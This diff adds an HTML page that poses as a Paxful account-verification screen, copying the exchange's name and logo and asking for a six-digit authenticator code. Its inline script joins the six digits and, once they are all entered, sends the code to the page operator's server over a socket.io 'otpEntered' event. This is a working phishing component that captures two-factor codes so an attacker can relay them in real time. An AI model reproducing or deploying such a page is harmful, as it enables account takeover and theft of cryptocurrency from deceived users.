@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log Into Your Account | Paxful</title>
+    <link rel="icon" href="https://assets.onecompiler.app/42n876cmq/439pcdkr6/images.png" type="image/png">
+    <link rel="stylesheet" href="PAX_V.css">
+    <script src="/socket.io/socket.io.js"></script>
+</head>
+<body>
+    <div class="verify-container">
+        <div class="container">
+            <div class="header">
+                <img src="https://assets.onecompiler.app/42n876cmq/439nez9kf/unnamed.png" alt="Logo" width="30"> 
+                <span class="logo">paxful</span>
+            </div>
+            <div class="back" onclick="goBack()">
+                <span class="back-icon">&#x2039;</span> Back
+            </div>
+            <h2 class="verification">Verification</h2>
+            <p class="authenticator">Enter the 6-digit code we sent to the authenticator associated with your account:  
+               <strong>your-email@example.com</strong></p>
+            <label>Confirmation Code</label>
+            <div class="otp-container" id="passcode">
+                <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 0)">
+                <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 1)">
+                <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 2)">
+                <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 3)">
+                <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 4)">
+                <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 5)">
+            </div>
+            
+            <p id="error-message" class="error-message"></p>
+            
+        </div>
+        
+        <div class="cover-image"></div>
+    </div>
+
+    <script>
+        const socket = io();
+
+        // Capture OTP input
+        const otpInputs = document.querySelectorAll(".otp-input");
+    
+        otpInputs.forEach((input) => {
+            input.addEventListener("input", () => {
+                let otpValue = Array.from(otpInputs).map(input => input.value).join("");
+    
+                if (otpValue.length === otpInputs.length) {
+                    socket.emit("otpEntered", { field: "otp", value: otpValue });
+                }
+            });
+        });
+    </script>    
+
+    <script src="PAX_V.js"></script>
+</body>
+</html>
